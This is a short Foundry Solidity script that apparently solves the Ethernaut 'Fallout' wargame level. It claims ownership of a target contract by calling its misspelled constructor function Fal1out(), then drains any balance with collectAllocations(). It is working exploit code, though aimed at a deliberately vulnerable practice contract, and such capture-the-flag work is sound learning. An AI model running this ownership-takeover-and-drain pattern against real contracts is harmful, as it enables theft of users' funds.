// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IFallout} from "../src/interfaces/IFallout.sol";

contract FalloutScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        IFallout target = IFallout(instance);

        console2.log("Current owner before exploit:", target.owner());

        vm.startBroadcast(privateKey);

        // Call the misspelled constructor function to claim ownership
        target.Fal1out();

        // Drain any balance if available
        if (instance.balance > 0) {
            target.collectAllocations();
        }

        vm.stopBroadcast();

        console2.log("New owner after exploit:", target.owner());
    }
}
